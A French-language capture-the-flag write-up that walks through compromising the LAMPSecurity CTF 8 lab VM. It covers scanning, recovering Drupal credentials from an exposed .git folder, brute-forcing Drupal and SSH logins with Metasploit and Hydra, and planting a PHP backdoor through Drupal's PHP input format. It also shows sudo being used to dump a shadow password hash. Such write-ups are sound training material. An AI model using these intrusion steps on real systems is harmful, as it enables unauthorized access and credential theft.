# Solution du LAMPSecurity CTF #8

Nitro
-----

Le [LAMPSecurity CTF 8](http://vulnhub.com/entry/lampsecurity-ctf8,87/) est comme son nom l'indique le 8ième de la série et le dernier que l'on trouve sur *VulnHub*.  

Cet opus a montré quelques points intéressants par rapport aux précédents qui montraient peu d'intérêt (faille include).  

Veni
----

```plain
Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-17 08:53 CEST
Nmap scan report for 192.168.1.60
Host is up (0.00018s latency).
Not shown: 65509 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0            4096 Jun 05  2013 pub
22/tcp   open  ssh         OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 5e:ca:64:f0:7f:d2:1a:a2:86:c6:1f:c2:2a:b3:6b:27 (DSA)
|_  2048 a3:39:2d:9f:66:96:0d:82:ad:52:1f:a1:dc:b1:f1:54 (RSA)
25/tcp   open  smtp        Symantec Enterprise Security manager smtpd
| smtp-commands: localhost.localdomain Hello [192.168.1.3], --- snip ---
80/tcp   open  http        Apache httpd 2.2.3 ((CentOS))
|_http-favicon: Drupal CMS
| http-git: 
|   192.168.1.60:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: initial commit 
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /sites/ /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /install.php /INSTALL.txt /LICENSE.txt 
|_/MAINTAINERS.txt
|_http-title: LAMPSecurity Research
110/tcp  open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA SASL(PLAIN) TOP STLS UIDL PIPELINING USER RESP-CODES
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            944/udp  status
|_  100024  1            947/tcp  status
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd
|_imap-capabilities: SORT IDLE completed LOGIN-REFERRALS --- snip ---
443/tcp  open  ssl/http    Apache httpd 2.2.3 ((CentOS))
| http-git: 
|   192.168.1.60:443/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: initial commit 
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /sites/ /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /install.php /INSTALL.txt /LICENSE.txt 
|_/MAINTAINERS.txt
|_http-title: LAMPSecurity Research
| ssl-cert: Subject: commonName=localhost.localdomain --- snip ---
| Not valid before: 2013-05-29T18:38:35+00:00
|_Not valid after:  2014-05-29T18:38:35+00:00
|_ssl-date: 2014-07-17T08:54:37+00:00; +2h00m13s from local time.
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
947/tcp  open  status      1 (RPC #100024)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            944/udp  status
|_  100024  1            947/tcp  status
993/tcp  open  ssl/imap    Dovecot imapd
|_imap-capabilities: SORT IDLE completed OK --- snip ---
| ssl-cert: Subject: commonName=imap.example.com
| Not valid before: 2013-05-29T18:38:44+00:00
|_Not valid after:  2014-05-29T18:38:44+00:00
|_ssl-date: 2014-07-17T08:54:39+00:00; +2h00m14s from local time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
995/tcp  open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: CAPA TOP SASL(PLAIN) UIDL PIPELINING USER RESP-CODES
| ssl-cert: Subject: commonName=imap.example.com
| Not valid before: 2013-05-29T18:38:44+00:00
|_Not valid after:  2014-05-29T18:38:44+00:00
|_ssl-date: 2014-07-17T08:54:39+00:00; +2h00m14s from local time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
3306/tcp open  mysql       MySQL (unauthorized)
5801/tcp open  vnc-http    RealVNC 4.0 (resolution: 400x250; VNC TCP port: 5901)
|_http-methods: No Allow or Public header in OPTIONS response (status code 501)
|_http-title: VNC viewer for Java
5802/tcp open  vnc-http    RealVNC 4.0 (resolution: 400x250; VNC TCP port: 5902)
|_http-methods: No Allow or Public header in OPTIONS response (status code 501)
|_http-title: VNC viewer for Java
5803/tcp open  vnc-http    RealVNC 4.0 (resolution: 400x250; VNC TCP port: 5903)
|_http-methods: No Allow or Public header in OPTIONS response (status code 501)
|_http-title: VNC viewer for Java
5804/tcp open  vnc-http    RealVNC 4.0 (resolution: 400x250; VNC TCP port: 5904)
|_http-methods: No Allow or Public header in OPTIONS response (status code 501)
|_http-title: VNC viewer for Java
5901/tcp open  vnc         VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    VNC Authentication (2)
5902/tcp open  vnc         VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    VNC Authentication (2)
5903/tcp open  vnc         VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    VNC Authentication (2)
5904/tcp open  vnc         VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    VNC Authentication (2)
6001/tcp open  X11         (access denied)
6002/tcp open  X11         (access denied)
6003/tcp open  X11         (access denied)
6004/tcp open  X11         (access denied)
MAC Address: 00:0C:29:9D:12:A9 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop
Service Info: Host: localhost.localdomain; OS: Unix

Host script results:
|_nbstat: NetBIOS name: LAMPSEC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.33-3.7.el5)
|   Computer name: localhost
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: localhost.localdomain
|_  System time: 2014-07-17T04:54:38-04:00
| smb-security-mode: 
|   Account that was used for smb scripts: guest
|   User-level authentication
|   SMB Security: Challenge/response passwords supported
|_  Message signing disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol
```

Le moins que l'on puisse dire c'est qu'il y a des services qui tournent !  

Pour commencer je me suis attaqué au dossier *.git* présent sur le serveur web.  

Avec quelques manipulations trouvées [dans cet article](http://mxey.wordpress.com/2012/09/02/leaving-a-git-repository-in-the-document-root/) il est possible de faire un *git checkout* et ainsi récupérer les fichiers suivis par *Git* sur le serveur web.  

Le fichier le plus intéressant est le fichier de configuration de *Drupal* (*sites/default/settings.php*) dans lequel on trouve :  

```php
$db_url = 'mysqli://root:JumpUpAndDown@localhost/drupal';
```

Malheureusement ce mot de passe ne permet pas de passer root (ce serais un peu simple) :  

```plain
$ ssh root@192.168.1.60
Welcome to LAMPSecurity Research SSH access!
#flag#5e937c51b852e1ee90d42ddb5ccb8997

Unauthorized access is expected...
root@192.168.1.60's password: 
Permission denied, please try again.
```

Remarquez qu'un peu partout on trouve des flags qui devaient sans doute servir à valider des étapes mais je ne m'y attarderai pas, l'objectif est d'arriver à obtenir l'accès root.  

Le serveur MySQL n'autorise malheureusement pas non plus les connexions distantes de l'utilisateur root. Il faut donc fouiner ailleurs.  

Sur le ftp publique on trouve un fichier *key* téléchargeable avec comme contenu *#flag#5eb798d41d2e53295d34005f49113fc0*.  

On peut visualiser la liste des partages SMB mais après impossible d'y accéder en utilisateur anonyme (smbclient retourne une erreur) :  

```plain
$ nmblookup -A 192.168.1.60
Looking up status of 192.168.1.60
        LAMPSEC         <00> -         B <ACTIVE> 
        LAMPSEC         <03> -         B <ACTIVE> 
        LAMPSEC         <20> -         B <ACTIVE> 
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 
        WORKGROUP       <1d> -         B <ACTIVE> 
        WORKGROUP       <1e> - <GROUP> B <ACTIVE> 
        WORKGROUP       <00> - <GROUP> B <ACTIVE>                                                                                                                                                              

        MAC Address = 00-00-00-00-00-00

$ smbclient -L LAMPSEC -N
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.33-3.7.el5]

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server Version 3.0.33-3.7.el5)
        public          Disk      Public Stuff
        homes           Disk      Home Directories
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.33-3.7.el5]

        Server               Comment
        ---------            -------
        LAMPSEC              Samba Server Version 3.0.33-3.7.el5

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAMPSEC
```

Vidi
----

Je suis passé sous *Metasploit* pour m'intéresser au *Drupal* installé à la racine.  

```plain
msf> use auxiliary/scanner/http/drupal_views_user_enum
msf auxiliary(drupal_views_user_enum) > show options

Module options (auxiliary/scanner/http/drupal_views_user_enum):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PATH     /                yes       Drupal Path
   Proxies                   no        Use a proxy chain
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    80               yes       The target port
   THREADS  1                yes       The number of concurrent threads
   VHOST                     no        HTTP server virtual host

msf auxiliary(drupal_views_user_enum) > set RHOSTS 192.168.1.60
RHOSTS => 192.168.1.60
msf auxiliary(drupal_views_user_enum) > exploit

[*] Begin enumerating users at 192.168.1.60
[*] Done. 21 usernames found...
[+] Found User: Anonymous
[+] Found User: admin
[+] Found User: Barbara
[+] Found User: Dan
[+] Found User: Gene
[+] Found User: George
[+] Found User: Harvey
[+] Found User: Jeff
[+] Found User: Jerome
[+] Found User: Jim
[+] Found User: John
[+] Found User: Johnathan
[+] Found User: Juan
[+] Found User: Michael
[+] Found User: Sally
[+] Found User: Sherry
[+] Found User: Stacey
[+] Found User: Steve
[+] Found User: Susan
[+] Found User: Tom
[+] Found User: Xavier
[*] Usernames stored in: /root/.msf4/loot/20140717193155_default_192.168.1.60_drupal_user_101878.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

On obtient une liste d'utilisateur mais elle n'est pas forcément appropriée pour une attaque brute-force : on dispose des prénoms et non des logins.  

Sur la page /profile des liens vers les différents profils avec les adresses emails. Il suffit de récupérer cela en retirant le *@localhost.localdomain* final.  

```plain
bdio
dhart
gconnor
gprune
hplink
jgrimes
jstone
jharraway
jgoldman
jalderman
jingersol
mswanson
sloreman
sholden
shunter
spinkton
sswiney
tmaloney
xbruce
```

A noter que sur le *Drupal* on peut trouver des articles que l'on ne voit pas normalement mais qui restent accessibles si on devine l'ID de l'article.  

Ainsi sur /comment/reply/28 on trouve #flag#57dbe55b42b307fb4115146d239955d0.  

A /phpinfo.php il y a un phpinfo() avec #flag#550e1bafe077ff0b0b67f4e32f29d751.  

Tout ça ne nous avance pas vraiment. Finalement j'ai trouvé [un article](http://www.madirish.net/408) sur le site de *MadIrish* (ben tiens) où l'on peut trouver un script Python de brute-force de comptes *Drupal*.  

Le script est un peu buggé et peu performant. Je n'ai pas pris la peine de le réécrire mais vous devriez au moins ajouter deux break sans quoi le script continue de brute-forcer un compte même s'il vient de trouver le mot de passe !  

Après avoir testé une petite wordlist pour les mots de passe j'ai utilisé celle de *RockYou* que *MadIrish* semble utiliser pour ses challenges.  

```plain
$ python drupal_bruterforce.py --target=http://192.168.1.60/ --userlist=users.txt --wordlist=rockyou.txt  --version=6
Please wait, working...
Drupal 6
Cracking ... admin
admin:football123
barbara:passw0rd
```

J'ai pas eu le courage d'aller jusqu'à la fin des utilisateurs. L'important est de disposer du compte admin *Drupal*.  

Finalement le plus dur dans ce challenge aura été de trouver comment placer du \*biiip\* code PHP dans cette \*biiip\* de *Drupal* de \*biiip\* (\*biiip\* !).  

Donc avis à la populace, il faut d'abord s'assurer que le module *"Input formats"* est bien activé dans les modules (*modules > Filter*).  

Dans les *Input formats* il faut alors s'assurer que *PHP code* est présent et que son option *PHP evaluator* est cochée.  

Et enfin lors de l'édition d'un contenu (article, etc.) il faut switcher le *Input format* sur *PHP code*.  

Une backdoor classique permet alors d'accéder au système de fichier.  

```plain
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
--- snip ---
sabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologin
jharraway:x:500:504::/home/jharraway:/bin/bash
spinkton:x:501:505::/home/spinkton:/bin/bash
sholden:x:502:506::/home/sholden:/bin/bash
bdio:x:503:507::/home/bdio:/bin/bash
jalderman:x:504:508::/home/jalderman:/bin/bash
gconnor:x:505:509::/home/gconnor:/bin/bash
sswiney:x:506:510::/home/sswiney:/bin/bash
dhart:x:507:511::/home/dhart:/bin/bash
gprune:x:508:512::/home/gprune:/bin/bash
hplink:x:509:513::/home/hplink:/bin/bash
jgrimes:x:510:514::/home/jgrimes:/bin/bash
shunter:x:511:515::/home/shunter:/bin/bash
jingersol:x:512:516::/home/jingersol:/bin/bash
mswanson:x:513:517::/home/mswanson:/bin/bash
jstone:x:514:518::/home/jstone:/bin/bash
jgoldman:x:515:519::/home/jgoldman:/bin/bash
tmaloney:x:516:520::/home/tmaloney:/bin/bash
xbruce:x:517:521::/home/xbruce:/bin/bash
sloreman:x:518:522:#flag#5b650c18929383074fea8870d857dd2e:/home/sloreman:/bin/bash
```

Vici
----

Je réutilise les identifiants *Drupal* pour tenter de trouver un compte Unix :  

```plain
$ ./hydra -L users.txt -P passwords.txt ssh://192.168.1.60
Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2014-07-18 18:16:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 38 login tries (l:19/p:2), ~0 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.1.60   login: spinkton   password: football123
[STATUS] attack finished for 192.168.1.60 (waiting for children to finish) ...
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-07-18 18:17:17

$ ssh spinkton@192.168.1.60
Welcome to LAMPSecurity Research SSH access!
#flag#5e937c51b852e1ee90d42ddb5ccb8997

Unauthorized access is expected...
spinkton@192.168.1.60's password: 
Last login: Thu Mar 27 12:48:29 2014 from 192.168.56.1
#flag#motd-flag
[spinkton@localhost ~]$
```

Dans l'historique bash de *M. Pinkton* on trouve beaucoup de commandes sudo. En fait l'utilisateur peut lancer tout ce qu'il souhaite :  

```plain
[spinkton@localhost ~]$ sudo head -1 /etc/shadow
root:$1$.GWA7rU/$lVPNjveio2K8Hpsuk.6N4/:15861:0:99999:7:::
```

Game over

*Published July 22 2014 at 13:25*